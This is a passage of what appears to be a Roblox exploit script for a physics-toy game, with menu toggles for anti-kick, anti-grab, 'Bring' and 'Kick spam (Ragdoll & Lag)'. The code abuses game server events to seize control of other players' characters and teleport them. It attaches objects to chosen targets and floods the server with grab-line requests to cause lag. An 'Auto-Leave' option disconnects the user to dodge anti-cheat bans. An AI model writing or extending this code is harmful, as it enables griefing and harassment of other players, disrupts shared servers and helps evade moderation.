                                            Vector3.new(0, 0, 0)
                                        )
                                    end)
                                end)
                            end
                            if isHome and homeFolder then
                                spawnedTarget = homeFolder:WaitForChild("NinjaShuriken", 2)
                            elseif not service.Workspace.PlotItems.PlayersInPlots:FindFirstChild(localPlayer.Name) and inv then
                                spawnedTarget = inv:WaitForChild("NinjaShuriken", 2)
                            end
                        end
                        kunai = spawnedTarget
                        if kunai == nil then
                            continue
                        end
                        kunai.Name = "AntiKick"
                        if not kunai then
                            continue
                        end
                    end
                    repeat
                        if kunai
                            and kunai:FindFirstChild("StickyPart")
                            and kunai.StickyPart.CanTouch == true then
                            if kunai:FindFirstChild("StickyPart") then
                                local currentHRP = HRP()
                                if currentHRP then
                                    if kunai:FindFirstChild("SoundPart") then
                                        if not kunai.SoundPart:FindFirstChild("PartOwner") or kunai.SoundPart.PartOwner.Value ~= localPlayer.Name then
                                            SetNetworkOwner:FireServer(kunai.SoundPart, kunai.SoundPart.CFrame)
                                        end
                                    end
                                    local firePart = currentHRP:FindFirstChild("FirePlayerPart") or currentHRP:WaitForChild("FirePlayerPart", 5)
                                    if firePart then
                                        StickyPartEvent:FireServer(
                                            kunai.StickyPart,
                                            firePart,
                                            CFrame.new(0, 0, 0) * CFrame.Angles(0, math.rad(90), math.rad(90))
                                        )
                                    end
                                    for _, obj in pairs(kunai:GetChildren()) do
                                        if obj:IsA("BasePart") then
                                            obj.CanTouch = false
                                            obj.CanCollide = false
                                            obj.CanQuery = false
                                            obj.Transparency = 1
                                        end
                                    end
                                    local stickyPart = kunai.StickyPart
                                    if stickyPart and not stickyPart:FindFirstChild("KunaiPNG_GUI") then
                                        local gui = Instance.new("BillboardGui")
                                        gui.Name = "KunaiPNG_GUI"
                                        gui.Adornee = stickyPart
                                        gui.AlwaysOnTop = true
                                        gui.Size = UDim2.new(1.2, 0, 1.2, 0)
                                        gui.DistanceUpperLimit = 1000
                                        gui.Parent = stickyPart
                                        local img = Instance.new("ImageLabel")
                                        img.Size = UDim2.fromScale(1, 1)
                                        img.BackgroundTransparency = 1
                                        img.Image = "rbxassetid://89062714375517"
                                        img.Parent = gui
                                    end
                                end
                            end
                            kunai.Name = "AntiKick"
                        end
                        task.wait(0.3)
                    until not kunai
                        or not Config.AntikickT
                        or not kunai:FindFirstChild("StickyPart")
                        or kunai.StickyPart.CanTouch == false
                        or not localPlayer.Character
                        or not localPlayer.Character:FindFirstChild("HumanoidRootPart")
                        or not kunai:FindFirstChild("StickyPart")
                        or (localPlayer.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20
                    if not kunai
                        or not kunai:FindFirstChild("StickyPart")
                        or not localPlayer.Character
                        or not localPlayer.Character:FindFirstChild("HumanoidRootPart")
                        or (localPlayer.Character.HumanoidRootPart.Position - kunai.StickyPart.Position).Magnitude >= 20 then
                        local targetInv = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                        if targetInv and DestroyToy then
                            for _, v in pairs(targetInv:GetChildren()) do
                                if v.Name == "AntiKick" or v.Name == "NinjaShuriken" then
                                    pcall(function()
                                        DestroyToy:FireServer(v)
                                    end)
                                end
                            end
                        end
                    end
                    pcall(function()
                        repeat
                            task.wait(0.05)
                        until not Config.AntikickT
                            or not localPlayer.Character
                            or not localPlayer.Character:FindFirstChild("Humanoid")
                            or not kunai
                            or not kunai:FindFirstChild("StickyPart")
                            or not kunai.StickyPart:FindFirstChild("StickyWeld")
                            or not kunai.StickyPart.StickyWeld.Part1
                        if not kunai
                            or not kunai:FindFirstChild("StickyPart")
                            or (localPlayer.Character
                                and localPlayer.Character:FindFirstChild("Humanoid")
                                and localPlayer.Character.Humanoid.Health <= 0)
                            or not kunai.StickyPart:FindFirstChild("StickyWeld")
                            or not kunai.StickyPart.StickyWeld.Part1 then
                            local targetInv = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                            if targetInv and DestroyToy then
                                for _, v in pairs(targetInv:GetChildren()) do
                                    if v.Name == "AntiKick" or v.Name == "NinjaShuriken" then
                                        pcall(function()
                                            DestroyToy:FireServer(v)
                                        end)
                                    end
                                end
                            end
                        end
                    end)
                end
            end)
        else
            Config.AntikickT = false
            local targetInv = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if targetInv and DestroyToy then
                for _, v in pairs(targetInv:GetChildren()) do
                    if v.Name == "AntiKick" or v.Name == "NinjaShuriken" then
                        pcall(function()
                            DestroyToy:FireServer(v)
                        end)
                    end
                end
            end
        end
    end
})

antikick:AddToggle("AntikickPenc", {
    Text = "Anti-Kick (Pencil ✏)",
    Default = false,
    Callback = function(Value)
        Config.Tinko = Value
        if Config.Tinko then
            while Config.Tinko do
                local spawnedFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
                while Config.Tinko and spawnedFolder and not spawnedFolder:FindFirstChild("PencilDDD") do
                    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local existingObjects = {}
                        for _, child in pairs(spawnedFolder:GetChildren()) do
                            existingObjects[child] = true
                        end
						spawntoy(
							"ToolPencil",
							CFrame.new(localPlayer.Character.HumanoidRootPart.CFrame.Position) + Vector3.new(0, 0, 15),
							Vector3.new(0, 0, 0)
						)                        local newPencil = nil
                        local startTime = tick()
                        repeat
                            for _, child in pairs(spawnedFolder:GetChildren()) do
                                if not existingObjects[child] and child.Name == "ToolPencil" then
                                    newPencil = child
                                    break
                                end
                            end
                            task.wait()
                        until newPencil or (tick() - startTime > 2) or not Config.Tinko
                        if newPencil then
                            newPencil.Name = "PencilDDD"
                        end
                    end
                    task.wait()
                end
                if localPlayer.Character then
                    if localPlayer.Character:FindFirstChild("Torso") and localPlayer.Character:FindFirstChild("HumanoidRootPart") and spawnedFolder and spawnedFolder:FindFirstChild("PencilDDD") then
                        local pencil = spawnedFolder.PencilDDD
                        if pencil:FindFirstChild("StickyPart") then
                            if pencil.StickyPart:FindFirstChild("StickyWeld") then
                                if pencil.StickyPart.StickyWeld.Part1 ~= localPlayer.Character.Torso then
                                    local a = pencil.SoundPart.CFrame.Position
                                    local b = localPlayer.Character.HumanoidRootPart.CFrame.Position
                                    local distance = Vector3.new((a.X - b.X) ^ 2, (a.Y - b.Y) ^ 2, (a.Z - b.Z) ^ 2)
                                    if math.sqrt(distance.X + distance.Y + distance.Z) > 20 then
                                        DestroyToy:FireServer(pencil)
                                    else
                                        StickyPartEvent:FireServer(pencil.StickyPart, localPlayer.Character.Torso, CFrame.new(0, - 1, 0) * CFrame.Angles(0, math.pi, 0))
                                        for _, prt in pairs(pencil:GetChildren()) do
                                            if prt.ClassName == "Part" then
                                                prt.CanQuery = false
                                            end
                                        end
                                        task.wait(0.2)
                                        if localPlayer.Character then
                                            if localPlayer.Character:FindFirstChild("Torso") and localPlayer.Character:FindFirstChild("HumanoidRootPart") and spawnedFolder:FindFirstChild("PencilDDD") then
                                                if pencil:FindFirstChild("StickyPart") then
                                                    if pencil.StickyPart:FindFirstChild("StickyWeld") then
                                                        if pencil.StickyPart.StickyWeld.Part1 ~= localPlayer.Character.Torso then
                                                            if spawnedFolder:FindFirstChild("PencilDDD") then
                                                                if pencil.StickyPart.StickyWeld.Part1 ~= localPlayer.Character.Torso then
                                                                    SetNetworkOwner:FireServer(pencil.SoundPart, pencil.SoundPart.CFrame)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait()
            end
        else
            local spawnedFolder = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
            if spawnedFolder then
                local dddPencil = spawnedFolder:FindFirstChild("PencilDDD")
                if dddPencil then
                    DestroyToy:FireServer(dddPencil)
                end
            end
        end
    end,
})

antikick:AddToggle("Antireset", {
	Text = "Auto-Reset",
    Default = true,
    Callback = function(Value)
        Config.AntikickResetToggle = Value
        if Config.AntikickResetToggle then
            Config.Contuuti['GameNotify'] = GameCorrectionsNotify.OnClientEvent:Connect(function(actionType)
                if actionType == "Flying" then
                    Struggle:FireServer(localPlayer)
                    local parent = GetCharacter()
                    local childName = "Humanoid"
                    local humanoid = parent:FindFirstChild(childName) or parent:WaitForChild(childName, nil)
                    if humanoid then
                        humanoid.Health = 0
                    end
                end
            end)
        else
            local playname = "GameNotify"
            for connectionName, connection in Config.Contuuti do
                if connectionName:find(playname) then
                    connection:Disconnect()
                    connection = nil
                end
            end
        end
    end
})

antikick:AddToggle("Antileave", {
	Text = "Auto-Leave",
    Default = false,
    Callback = function(Value)
        Config.AntikickLeaveToggle = Value
        if Config.AntikickLeaveToggle then
            Config.Contuuti['GameLeaveNotify'] = GameCorrectionsNotify.OnClientEvent:Connect(function(actionType)
                if actionType == "Flying" then
                    localPlayer:Kick("Disconnected to prevent ban. [by: Vortex]")
                end
            end)
        else
            local localname = "GameLeaveNotify"
            for connectionName, connection in Config.Contuuti do
                if connectionName:find(localname) then
                    connection:Disconnect()
                    connection = nil
                end
            end
        end
    end
})

antikick:AddToggle("AntiEnable", {
	Text = "Auto-Enable",
    Default = true,
    Callback = function(Value)
        Config.AutoTurnOnAntiKick = Value
        if Config.AutoTurnOnAntiKick then
            Config.Contuuti['AntiKickAutoOn'] = GameCorrectionsNotify.OnClientEvent:Connect(function(actionType)
                if actionType == "Flying" then
                    if not Config.antikick and Config.AntiKickToggle then
                        Config.AntiKickToggle:Set(true)
                    end
                end
            end)
        else
            if Config.Contuuti['AntiKickAutoOn'] then
                Config.Contuuti['AntiKickAutoOn']:Disconnect()
                Config.Contuuti['AntiKickAutoOn'] = nil
            end
        end
    end
})

local function runTPPLoop()
	task.spawn(function()
		while Config.TargetAntigrabtpT do
			local HRP = HRP()
			service.RunService.RenderStepped:Wait()
			if #Config.PlayerListAnti == 0 then 
				continue
			end
			for _, targetName in ipairs(Config.PlayerListAnti) do
				target = service.Players:FindFirstChild(targetName)
				if not target or not target.Character then
					continue
				end
				char = target.Character
				hrp = char:FindFirstChild("HumanoidRootPart")
				head = char:FindFirstChild("Head")
				if not hrp or not head then
					continue
				end
				partOwner = head:FindFirstChild("PartOwner")
				if not partOwner or partOwner.Value == "" or partOwner.Value == localPlayer.Name then
					continue
				end
				distance = (hrp.Position - HRP.Position).Magnitude
				if distance <= 30 then
					pcall(function()
						SetNetworkOwner:FireServer(hrp, hrp.CFrame)
						CreateGrabLine:FireServer(hrp, Vector3.zero, hrp.Position, false)
					end)
					weOwnIt = head:FindFirstChild("PartOwner") and head.PartOwner.Value == localPlayer.Name
					if weOwnIt then
						if Config.tpmode == "Bring" then
							hrp.CFrame = HRP.CFrame * CFrame.new(0, 5, 0)
							hrp.AssemblyLinearVelocity = Vector3.zero
							hrp.AssemblyAngularVelocity = Vector3.zero
						end
						pcall(function()
							DestroyGrabLine:FireServer(hrp)
						end)
					end
				else
					saved = HRP.CFrame
					HRP.CFrame = hrp.CFrame * CFrame.new(0, 0, 2)
					task.wait(0.05)
					for i = 1, 15 do
						pcall(function()
							SetNetworkOwner:FireServer(hrp, hrp.CFrame)
							CreateGrabLine:FireServer(hrp, Vector3.zero, hrp.Position, false)
						end)
						task.wait(0.01)
					end
					weOwnIt = head:FindFirstChild("PartOwner") and head.PartOwner.Value == localPlayer.Name
					if weOwnIt then
						if Config.tpmode == "Bring" then
							hrp.CFrame = saved * CFrame.new(0, 5, 0)
							hrp.AssemblyLinearVelocity = Vector3.zero
							hrp.AssemblyAngularVelocity = Vector3.zero
							task.wait(0.05)
						end
						pcall(function()
							DestroyGrabLine:FireServer(hrp)
						end)
					end
					HRP.CFrame = saved
					HRP.AssemblyLinearVelocity = Vector3.zero
					HRP.AssemblyAngularVelocity = Vector3.zero
				end
			end
		end
	end)
end

local Tar = dadadadad:AddPlayersDropdown("TargetSelect1", {
    Text = "Select Target",
    Multi = false,
    ExcludeLocalPlayer = true,
    Searchable = false,
    EnablePlayerImages = true,
    Callback = function(player)
        if player then
            Config.PlayerListAnti = { player.Name }
        else
            Config.PlayerListAnti = {}
        end
    end,
})

dadadadad:AddDropdown("Config.tpmode", {
	Text = "Method",
	Values = {"Grab", "Bring"},
	Default = "Grab",
	Callback = function(v)
		Config.tpmode = v
	end
})

dadadadad:AddToggle("TPPEnabled", {
	Text = "Anti-Grab",
	Default = false,
	Callback = function(v)
		Config.TargetAntigrabtpT = v
		if v then
			runTPPLoop()
		end
	end
})

dadadadad:AddToggle("TPPAntiKick", {
	Text = "Anti-Kick",
	Default = false,
	Callback = function(v)
		if not v then
			for _, targetName in ipairs(Config.PlayerListAnti) do
				target = service.Players:FindFirstChild(targetName)
				if target then
					targetInv = service.Workspace:FindFirstChild(target.Name .. "SpawnedInToys")
					if targetInv and targetInv:FindFirstChild("TPPShuriken_" .. targetName) then
						pcall(function() DestroyToy:FireServer(targetInv["TPPShuriken_" .. targetName]) end)
					end
				end
			end
			return
		end
		task.spawn(function()
			shurikens = {}
			setupDone = {}
			while Toggles.TPPAntiKick.Value do
				service.RunService.RenderStepped:Wait()
				if #Config.PlayerListAnti == 0 then
					continue
				end
				for _, targetName in ipairs(Config.PlayerListAnti) do 
					pcall(function()
						target = service.Players:FindFirstChild(targetName)
						if not target or not target.Character then
							setupDone[targetName] = false
							return
						end
						targetChar = target.Character
						targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
						targetFirePart = targetHRP and targetHRP:FindFirstChild("FirePlayerPart")

						if not targetHRP or not targetFirePart then
							return
						end
						myChar = localPlayer.Character
						myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
						if myHRP then
							dist = (targetHRP.Position - myHRP.Position).Magnitude
							if dist > 30 then
								setupDone[targetName] = false
								return
							end
						end
						targetInv = service.Workspace:FindFirstChild(target.Name .. "SpawnedInToys")
						if not targetInv then
							return
						end
						shuName = "TPPShuriken_" .. targetName
						shuData = shurikens[targetName]
						shu = shuData and shuData.toy
						part = shuData and shuData.part
						shuExists = shu and shu.Parent ~= nil
						partExists = part and part.Parent ~= nil
						if setupDone[targetName] and (not shuExists or not partExists) then
							setupDone[targetName] = false
							shurikens[targetName] = nil
						end
						if not setupDone[targetName] then
							if not target.CanSpawnToy or not target.CanSpawnToy.Value then
								return
							end
							local function spawntoy(toy, cf)
								if not localPlayer.CanSpawnToy.Value then
									localPlayer.CanSpawnToy.Changed:Wait()
								end
								local t
								local toyadded
								inv = service.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
								toyadded = inv.ChildAdded:Connect(function(c)
									if c.Name == toy then
										t = c
										toyadded:Disconnect()
									end
								end)
								task.spawn(function()
									SpawnToyRemoteFunction:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
								end)
								time = tick() + 1
								repeat task.wait() until t or tick() > time
								if t then
									return t
								else
									return nil
								end
							end
							shu = spawntoy("NinjaShuriken", targetHRP.CFrame * CFrame.new(5, 10, 20))
							if not shu then
								return
							end
							shu.Name = shuName
							part = shu:WaitForChild("StickyPart", 0.5)
							if not part then
								return
							end
							SetNetworkOwner:FireServer(part, part.CFrame)
							task.wait(0.1)
							StickyPartEvent:FireServer(part, targetFirePart, CFrame.new(0, 0, 0, 1, 0, 0, 0, 0, -1, 0, 1, 0))
							shurikens[targetName] = {
								toy = shu,
								part = part,
							}
							setupDone[targetName] = true
						end
						if part and part:FindFirstChild("PartOwner") and part.PartOwner.Value ~= localPlayer.Name then
							SetNetworkOwner:FireServer(part, part.CFrame)
						end
						for _, toy in ipairs(targetInv:GetChildren()) do
							if toy:FindFirstChild("StickyPart") then
								sp = toy.StickyPart
								po = sp:FindFirstChild("PartOwner")
								sw = sp:FindFirstChild("StickyWeld")
								if po and po.Value ~= "" and po.Value ~= target.Name then
									SetNetworkOwner:FireServer(sp, sp.CFrame)
									task.wait()
									if po.Value == localPlayer.Name then
										sp.CFrame = CFrame.new(0, 0/0, 0)
									end
								end
								if sw and sw.Part1 then
									weldParent = sw.Part1.Parent
									if weldParent and weldParent ~= targetChar then
										SetNetworkOwner:FireServer(sp, sp.CFrame)
										task.wait()
										if po and po.Value == localPlayer.Name then
											sp.CFrame = CFrame.new(0, 0/0, 0)
										end
									end
								end
							end
						end
					end)
				end
			end
			for targetName, data in pairs(shurikens) do
				pcall(function()
					if data.toy then
						DestroyToy:FireServer(data.toy)
					end
				end)
			end
			shurikens = {}
			setupDone = {}
		end)
	end
})


local TargetDropdown = Targ:AddPlayersDropdown("TargetSelect", {
    Text = "Select Target",
    Multi = false,
    ExcludeLocalPlayer = true,
    Searchable = false,
    EnablePlayerImages = true,
    Callback = function(player)
        if player then
            Config.PlayerList = { player.Name }
        else
            Config.PlayerList = {}
        end
    end,
})

spamde:AddToggle("KickspamRag", {
    Text = "Kick spam (Ragdoll & Lag)",
    Default = false,
    Callback = function(aa61)
        Config.aa6 = aa61
        Config.aa13 = aa61
        if aa61 then
            if not Config.PlayerList or #Config.PlayerList == 0 then
                task.spawn(function()
                    Toggles.KickspamRag:SetValue(false)
                end)
                return
            end
        end
        
        local function aa31(aa32, aa33, aa34)
            return aa32:FindFirstChild(aa33) or aa32:WaitForChild(aa33, aa34 or 5)
        end
        
        local function aa35(aa36)
            if aa36 and aa36:IsA("BasePart") then
                SetNetworkOwner:FireServer(aa36, aa36.CFrame)
                task.wait()
            end
        end
        
        local function aa37(aa38, aa39)
            return aa38:FindFirstChild(aa39) ~= nil
        end
        
        local function aa40(aa41)
            local aa42 = GetCharacter()
            local aa43 = aa42:WaitForChild("HumanoidRootPart")
            local waitCount = 0
            while (localPlayer.InPlot.Value and not localPlayer.InOwnedPlot.Value) and waitCount < 50 do
                task.wait(0.1)
                waitCount = waitCount + 1
            end
            waitCount = 0
            while not localPlayer.CanSpawnToy.Value and waitCount < 50 do
                task.wait(0.1)
                waitCount = waitCount + 1
            end
            local aa44 = aa43.CFrame * CFrame.new(0, 14, 20)
            local aa45 = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
            if not aa45 then
                aa45 = workspace:FindFirstChild("PlotItems")
                if aa45 then
                    aa45 = aa45:FindFirstChild("Plot1")
                end
            end
            if not aa45 then
                aa45 = workspace
            end
            local aa46 = nil
            local aa47 = aa45.ChildAdded:Connect(function(aa48)
                if aa48.Name == aa41 then
                    aa46 = aa48
                end
            end)
            task.spawn(function()
                pcall(function()
                    spawntoy(aa41, aa44, Vector3.zero)
                end)
            end)
            local aa49 = tick()
            repeat task.wait(0.05) until aa46 or (tick() - aa49) > 5
            aa47:Disconnect()
            return aa46
        end
        
        local function aa50()
            if Config.aa17 then return nil end
            Config.aa17 = true
            local aa51 = aa40("PalletLightBrown")
            if not aa51 then
                Config.aa17 = false
                return nil
            end
            local aa52 = aa31(aa51, "SoundPart", 3)
            if not aa52 then
                aa51:Destroy()
                Config.aa17 = false
                return nil
            end
            local retryCount = 0
            while retryCount < 10 do
                if not Config.aa13 then
                    aa51:Destroy()
                    Config.aa17 = false
                    return nil
                end
                aa35(aa52)
                task.wait()
                if aa37(aa52, "PartOwner") then
                    break
                end
                retryCount = retryCount + 1
            end
            if not aa37(aa52, "PartOwner") then
                aa51:Destroy()
                Config.aa17 = false
                return nil
            end            for _, aa54 in pairs(aa51:GetDescendants()) do
                if aa54:IsA("BasePart") then
                    aa54.CanCollide = false
                    aa54.Transparency = 0.8
                end
            end
            aa51.Name = "RagdollPalete"
            local aa55 = Instance.new("BodyVelocity")
            aa55.MaxForce = Vector3.new(0, math.huge, 0)
            aa55.Velocity = Vector3.new(0, 900, 0)
            aa55.Parent = aa52

            Config.aa17 = false
            return aa51
        end
        
        local function aa25(aa26, aa27)
            if not aa26.Character then return end
            local aa28 = aa26.Character:FindFirstChild("HumanoidRootPart")
            if not aa28 or not aa27 then return end
            local aa29 = aa27.CFrame
            aa27.CFrame = aa28.CFrame * CFrame.new(0, 0, 2)
            for aa30 = 1, 15 do
                SetNetworkOwner:FireServer(aa28, aa28.CFrame)
                task.wait()
            end
            aa27.CFrame = aa29
        end
        
        local function startLagSpam()
            if Config.running then return end
            if not Config.PlayerList or #Config.PlayerList == 0 then return end
            if not CreateGrabLine then
                CreateGrabLine = Events.GrabEvents:WaitForChild("CreateGrabLine", 3)
                if not CreateGrabLine then return end
            end
            Config.running = true
            task.spawn(function()
                while Config.running do
                    local spawnLocation = service.Workspace:FindFirstChild("SpawnLocation")
                        or service.Workspace:FindFirstChild("Spawn")
                        or (localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart"))

                    if spawnLocation then
                        CreateGrabLine:FireServer(spawnLocation, CFrame.new(math.random(-2010000000, 2000000001), 0, math.random(-2008100000, 2000200000)))
                    end
                    task.wait(0.001)
                end
            end)
        end
        
        local function stopLagSpam()
            if not Config.running then return end
            Config.running = false
        end
        
        if aa61 then
            if not Config.PlayerList or #Config.PlayerList == 0 then
                return
            end
            task.wait(0.5)
            task.defer(function()
                startLagSpam()
            end)
        else
            stopLagSpam()
        end
        if Config.aa6 then
            task.spawn(function()
                while Config.aa6 do
                    local targets = type(Config.PlayerList) == "table" and Config.PlayerList or {Config.PlayerList}
                    for _, targetName in ipairs(targets) do
                        local aa62 = service.Players:FindFirstChild(targetName)
                        local aa63 = localPlayer.Character
                        local aa64 = aa63 and aa63:FindFirstChild("HumanoidRootPart")
                        if aa62 and aa64 then
                            local aa65 = aa62.Character
                            local aa66 = aa65 and aa65:FindFirstChild("HumanoidRootPart")
                            if aa66 then
                                local aa67 = (aa64.Position - aa66.Position).Magnitude
                                if aa67 > Config.aa9 then
                                    aa25(aa62, aa64)
                                end
                                SetNetworkOwner:FireServer(aa66, aa66.CFrame)
                                if DestroyGrabLine then
                                    DestroyGrabLine:FireServer(aa66)
                                end
                                aa66.AssemblyLinearVelocity = Vector3.zero
                                aa66.AssemblyAngularVelocity = Vector3.zero
                                local aa68 = aa66:FindFirstChild("ControlBP")
                                if not aa68 then
                                    aa68 = Instance.new("BodyPosition")
                                    aa68.Name = "ControlBP"
                                    aa68.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    aa68.P = 800000
                                    aa68.Parent = aa66
                                end
                                aa68.Position = aa64.Position + Vector3.new(0, 15, 0)
                            end
                        end
                    end
                    task.wait(0.001)
                end
                local targets = type(Config.PlayerList) == "table" and Config.PlayerList or {Config.PlayerList}
                for _, targetName in ipairs(targets) do
                    local aa69 = service.Players:FindFirstChild(targetName)
                    if aa69 and aa69.Character then
                        local aa70 = aa69.Character:FindFirstChild("HumanoidRootPart")
                        if aa70 and aa70:FindFirstChild("ControlBP") then
                            aa70.ControlBP:Destroy()
                        end
                    end
                end
            end)
        end
        if aa61 then
            local aa71 = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
            local aa72 = nil
            Config.aa73 = service.RunService.RenderStepped:Connect(function()
                if not Config.aa13 then return end
                if not Config.PlayerList or #Config.PlayerList == 0 then return end
                local targets = type(Config.PlayerList) == "table" and Config.PlayerList or {Config.PlayerList}
                local targetName = targets[1]
                if not targetName then return end
                local aa74 = service.Players:FindFirstChild(targetName)
                if not aa74 or not aa74.Character then return end
                local aa75 = aa74.Character:FindFirstChild("HumanoidRootPart")
                local aa76 = aa74.Character:FindFirstChild("Humanoid")
                if not aa75 or not aa76 then return end
                if aa72 and aa72:IsDescendantOf(workspace) then
                    local aa77 = aa72:FindFirstChild("SoundPart")
                    if aa77 then
                        if not aa37(aa77, "PartOwner") then
                            aa72:Destroy()
                            aa72 = nil
                        end
                    else
                        aa72:Destroy()
                        aa72 = nil
                    end
                end
                if not Config.aa17 and (not aa72 or not aa72:IsDescendantOf(workspace)) then
                    aa72 = aa71 and aa71:FindFirstChild("RagdollPalete") or aa50()
                end
                if aa72 and aa72:FindFirstChild("SoundPart") then
                    local aa78 = aa76:FindFirstChild("Ragdolled")
                    if aa78 and not aa78.Value then
                        aa72.SoundPart.Position = aa75.Position
                    end
                end
            end)
        else
            if Config.aa73 then
                Config.aa73:Disconnect()
                Config.aa73 = nil
            end
        end
    end
})

Bring:AddDropdown("Bringmode", {
    Text = "Bring Method",
    Values = {"GRAB", "BLOBMAN"},
    Default = "GRAB",
    Callback = function(Value)
        Config.BringMode = Value
    end
})

local function getBlobman()
    local inv = SpawnedInToys
    local v = inv and inv:FindFirstChild("CreatureBlobman")
    if not v then
        for _, p in ipairs(PlotItems:GetChildren()) do
            local m = p:FindFirstChild("CreatureBlobman")
            if m and m:FindFirstChild("PlayerValue") and m.PlayerValue.Value == localPlayer.Name then
                v = m
                break
            end
        end
    end
    return v
end

local function spawnBLob2()
    local char = GetCharacter()
    local tFolder = service.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
    local existing = tFolder:FindFirstChild("CreatureBlobman")
    if existing then 
        return existing 
    end
    task.spawn(function()
        pcall(function() 
            spawntoy("CreatureBlobman", char.Head.CFrame, Vector3.new(0, 0, 0)) 
        end)
    end)
    local blobman
    for _ = 1, 50 do
        blobman = tFolder:FindFirstChild("CreatureBlobman")
        if blobman then 
            break 
        end
        task.wait(0.05)
    end
    return blobman
end

local function sitOnBlobman(blobman)
    local char = localPlayer.Character
    if not char then return end

    local root = char:FindFirstChild("HumanoidRootPart")
    local humanoid = char:FindFirstChild("Humanoid")
    if not root or not humanoid then return end

    if not blobman then
        spawnBLob2()
        blobman = getBlobman() 
    end

    if blobman then
        local seat = blobman:FindFirstChildOfClass("VehicleSeat") or blobman:FindFirstChild("VehicleSeat")
        
        if seat and humanoid.SeatPart ~= seat then
            seat:Sit(humanoid)
        end
    end
end
Bring:AddButton({
    Text = "Bring",
    Func = function()
        local selected = Config.PlayerList
        local EmptyTable = type(selected) == "table" and #selected == 0
        local EmptyString = type(selected) == "string" and (selected == "" or selected == nil)
        if not selected or EmptyTable or EmptyString then
            return
        end
        local targetList = type(selected) == "table" and selected or {selected}
        local validTargets = {}
        for _, playerName in ipairs(targetList) do
            local Player = service.Players:FindFirstChild(playerName)
            if Player and Player.Character then
                table.insert(validTargets, Player)
            end
        end
        if #validTargets == 0 then
            return
        end
        local mode = Config.BringMode or "GRAB"
        local Camera = workspace.CurrentCamera
        local originalCameraCFrame = Camera.CFrame
        local originalCameraType = Camera.CameraType
        local character = GetCharacter()
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if mode == "GRAB" then
            Camera.CameraType = Enum.CameraType.Scriptable
            Camera.CFrame = originalCameraCFrame
            local root = character and character:WaitForChild("HumanoidRootPart")
            if not root then 
                Camera.CameraType = originalCameraType
                Camera.CFrame = originalCameraCFrame
                return 
            end
            for _, targetPlayer in ipairs(validTargets) do
                if targetPlayer.Character and targetPlayer.Character.Parent == workspace then
                    local targetCharacter = targetPlayer.Character
                    local torso = targetCharacter:FindFirstChild("Torso")
                    local head = targetCharacter:FindFirstChild("Head")
                    local hrp = targetCharacter:FindFirstChild("HumanoidRootPart")
                    if torso then
                        Struggle:FireServer()
                        local char = GetCharacter()
                        local myHrp = char and char:FindFirstChild("HumanoidRootPart")
                        if myHrp then
                            local stop = false
                            task.spawn(function()
                                repeat
                                    task.wait(0.01)
                                    if torso:FindFirstChild("PartOwner") and torso:FindFirstChild("PartOwner").Value == p.Name then
                                        stop = true
                                        break
                                    end
                                until stop
                            end)
                            local maxRange = 24
                            local isNear = (torso.Position - myHrp.Position).Magnitude <= maxRange
                            if isNear then
                                for i = 1, 12 do
                                    if stop then break end
                                    SetNetworkOwner:FireServer(torso, torso.CFrame)
                                    task.wait(0.02)
                                end
                            else
                                local origPos = myHrp.CFrame
                                task.wait(0.03)
                                for i = 1, 18 do
                                    if stop then break end
                                    
                                    local vel = torso.AssemblyLinearVelocity
                                    local predPos
                                    if vel.Magnitude < 2 then
                                        predPos = torso.Position
                                    else
                                        local pingMs = service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
                                        local predTime = (pingMs / 1000) * 0.8 + 0.05
                                        local gravity = Vector3.new(0, - workspace.Gravity * 0.5, 0)
                                        predPos = torso.Position + (vel * predTime) + (gravity * predTime * predTime * 0.5)
                                    end
                                    myHrp.CFrame = CFrame.new(predPos) * CFrame.new(0, 10, 0)
                                    task.wait(0.01)
                                    SetNetworkOwner:FireServer(torso, torso.CFrame)
                                end
                                task.wait(0.01)
                                myHrp.CFrame = origPos
                            end
                            stop = true
                            task.spawn(function()
                                repeat 
                                    task.wait() 
                                until (head and not head:IsGrounded() and head.AssemblyRootPart.ReceiveAge == 0) or not targetCharacter.Parent
                                local currentMyHrp = GetCharacter() and GetCharacter():FindFirstChild("HumanoidRootPart")
                                if currentMyHrp and torso then
                                    torso.CFrame = currentMyHrp.CFrame + (currentMyHrp.CFrame.LookVector * 5)
                                    if hrp then
                                        hrp.AssemblyLinearVelocity = Vector3.zero
                                    end
                                end
                            end)

                            DestroyGrabLine:FireServer(torso)
                        end
                    end
                end
            end
            Camera.CameraType = originalCameraType
            Camera.CFrame = originalCameraCFrame
            if humanoid then
                Camera.CameraSubject = humanoid
            end
        elseif mode == "BLOBMAN" then
            local blobman = spawnBLob2()
            if not blobman then 
                return 
            end
            sitOnBlobman(blobman)
            local myChar = GetCharacter()
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local humanoid2 = myChar and myChar:FindFirstChildOfClass("Humanoid")
            if not myHrp or not humanoid2 then 
                return 
            end
            local isSeatedInVehicle = false
            for _ = 1, 30 do
                if humanoid2.SeatPart and humanoid2.SeatPart:IsA("VehicleSeat") then
                    isSeatedInVehicle = true
                    break
                end
                task.wait(0.05)
            end
            if not isSeatedInVehicle then 
                return 
            end
            for _, targetPlayer in ipairs(validTargets) do
                local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if targetHrp then
                    local originalCFrame = myHrp.CFrame
                    pcall(function()
                        myHrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, -3)
